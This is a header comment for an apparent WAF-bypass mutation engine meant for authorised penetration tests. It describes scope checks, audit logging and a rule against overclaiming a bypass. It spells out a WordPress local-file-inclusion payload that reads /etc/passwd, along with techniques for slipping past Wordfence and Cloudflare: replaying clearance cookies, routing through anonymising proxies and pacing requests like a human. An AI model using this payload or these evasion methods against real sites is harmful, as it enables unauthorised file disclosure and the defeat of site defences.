// VARVEL -- wafbypass: the WAF-bypass mutation engine (authorized engagements only).
//
// Why it exists: against a Wordfence+Cloudflare target, the naive public exploit shape
// for an unauthenticated WordPress LFI (POST /wp-admin/admin-ajax.php,
// action=madara_load_more, template=../../../../../../etc/passwd) gets 403-signed by
// Wordfence. The question this engine answers is a general one: which MUTATION of the
// payload does the WAF not sign while the server-side stack still executes it? The
// matrix is class-driven (lfi today; sqli/xss ship as real but shallower matrices) so
// new classes plug into the same oracle + egress + governance skeleton.
//
// THE HONESTY CONTRACT (core doctrine, non-negotiable): a shape is reported as passing
// ONLY when the success marker regex is observed in the response body AND the shape
// survives 3 stability re-verifications. No marker, no bypass claim -- ever. A shape
// that passes once and then fails re-verification is recorded under unstable[] and is
// explicitly NOT claimed. Gaps are phrased "unobserved, not absent".
//
// GOVERNANCE: the signed engagement scope is checked BEFORE any request (target host
// resolved, every resolved IP must sit inside the signed CIDRs; the refusal prints the
// signed scope). ALL egress rides the ghost chain (engine/ghost) -- a public target with
// no configured/verified chain is refused fail-closed; private/range targets go direct
// per ghost doctrine (lab traffic never leaves the lab). One audit line per run.
//
// Pacing/budget: sequential requests, paceMs apart request-start to request-start
// (human cadence default 1200ms), hard request budget counting stability re-checks.
//
// THE VAULT RIDE (2026-08-10, the manhuaus lesson: a cookieless matrix against a
// Cloudflare-challenged zone is 24/24 burned at the edge even when a valid clearance
// sits in the vault): by default the engine AUTO-RIDES a valid, unexpired clearance
// vault entry for the target zone -- every request then carries the entry's EXACT
// cookie + UA (scrubHeaders pins the vault UA through the persona scrub) over the
// transport the entry's egressId binds (broker.resolveRideTransport: a chain-keyed
// entry exits the armed ghost chain whose canonical id MATCHES the entry's, a
// direct-keyed entry rides direct where ghost doctrine allows, fail-closed states are
// inherited as refusals). The lookup runs under rideEgressId parity (the same egress
// id the mint side vaults under); opts.egressId / opts.vaultPath / opts.ghost are the
// seams. --no-ride forces cookieless; no valid/expired entry proceeds cookieless with
// an explicit gaps[] note, never a silent assumption. The report names the ride
// ({ ride: { egressId, transport, mintedAt, expiresAt } }) -- the cookie itself is a
// live credential and NEVER appears in the report or audit line.

